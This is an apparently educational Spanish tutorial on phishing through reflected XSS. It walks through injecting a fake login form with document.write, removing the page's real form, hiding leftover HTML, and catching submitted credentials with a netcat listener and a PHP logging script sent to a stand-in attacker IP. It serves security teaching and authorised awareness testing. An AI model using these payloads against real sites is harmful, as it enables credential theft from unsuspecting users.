# Ataque: Phishing

## La idea central

Un ataque de phishing vía XSS consiste en inyectar un **formulario de login falso** dentro de una página legítima, de forma que la víctima — confiando en que está en el sitio real — introduzca sus credenciales directamente en un formulario que las envía al servidor del atacante.

Esto tiene una ventaja decisiva frente al phishing tradicional (un dominio falso parecido al real): la URL en la barra de direcciones **es genuinamente la del sitio legítimo**. La víctima no tiene ninguna señal visual de alarma que la haga sospechar.

> **Uso defensivo legítimo**: si se descubre una vulnerabilidad XSS durante una auditoría autorizada, este mismo ataque puede usarse como **ejercicio de concienciación de seguridad** (simulación de phishing controlada) para evaluar si los empleados de una organización confían ciegamente en su propia aplicación interna sin sospechar de comportamientos anómalos.

## Paso 1: descubrir la vulnerabilidad

Sobre un visor de imágenes en línea (donde se introduce una URL y la página la muestra), el payload básico (`<script>alert(...)</script>`) puede no ejecutarse de inmediato — el contexto de inyección puede requerir un payload distinto. El proceso de descubrimiento sistemático visto anteriormente en este bloque (observar cómo se refleja la entrada en el código fuente, adaptar el payload al contexto) es exactamente lo que hace falta aquí antes de avanzar.

## Paso 2: construir el formulario de login falso

```html
<h3>Please login to continue</h3>
<form action=http://IP_ATACANTE>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

El atributo `action` apunta a la IP del atacante — al enviarse el formulario, las credenciales viajarán hasta allí.

## Paso 3: incrustar el formulario vía XSS

Para inyectar HTML completo (no solo JavaScript simple) usando la vulnerabilidad descubierta, se recurre a `document.write()`:

```js
document.write('<h3>Please login to continue</h3><form action=http://IP_ATACANTE><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Este código JavaScript se incrusta como payload, en lugar del `alert()` usado durante el descubrimiento — si es una vulnerabilidad XSS reflejada, basta con compartir la URL completa con la víctima.

## Paso 4: limpieza — hacer el engaño convincente

Que el formulario original siga visible junto al falso resta credibilidad al engaño. Hay que **eliminar** el elemento original, usando el inspector del navegador (`Ctrl+Shift+C`) para identificar su `id`:

```js
document.getElementById('urlform').remove();
```

Combinando todo en una sola línea de payload:

```js
document.write('...formulario falso...');document.getElementById('urlform').remove();
```

### Limpiando restos de HTML original

Si tras el formulario falso sigue apareciendo un fragmento del HTML original (porque el payload se inyectó en medio del documento, no al final), una técnica sencilla es **comentar** todo lo que sigue, añadiendo el inicio de un comentario HTML justo después del payload:

```
...PAYLOAD... <!--
```

Esto convierte en comentario (invisible) cualquier resto del HTML original que aparezca después, dejando la página con una apariencia limpia y completamente convincente.

## Paso 5: capturar las credenciales

Con el formulario falso desplegado, falta solo recibir lo que la víctima envíe. Un servidor mínimo con `netcat` o PHP es suficiente:

```bash
sudo nc -lvnp 80
```

O, para procesar los datos de forma más estructurada, un pequeño servidor PHP que registre lo recibido:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("credentials.txt", "a+");
    fputs($file, "IP: {$_SERVER['REMOTE_ADDR']} | User: {$_GET['username']} | Pass: {$_GET['password']}\n");
    fclose($file);
}
?>
```

```bash
mkdir /tmp/phishing && cd /tmp/phishing
sudo php -S 0.0.0.0:80
```

En cuanto la víctima rellene el formulario falso y pulse "Login", sus credenciales llegarán directamente al atacante — sin que la aplicación legítima llegue siquiera a procesarlas, ya que el formulario inyectado nunca se comunicó con el backend real.

## Por qué este ataque es tan efectivo en la práctica

Combina dos factores psicológicos potentes: **confianza en la URL/dominio legítimo** (la barra de direcciones no miente) y **contexto plausible** (si el formulario aparece justo donde la víctima esperaba interactuar normalmente con la aplicación, no hay fricción que despierte sospechas). Es exactamente el tipo de escenario que demuestra por qué XSS, pese a "solo" ejecutarse en el cliente, puede tener consecuencias tan graves como el robo directo de credenciales — sin necesitar ninguna vulnerabilidad adicional en el backend.
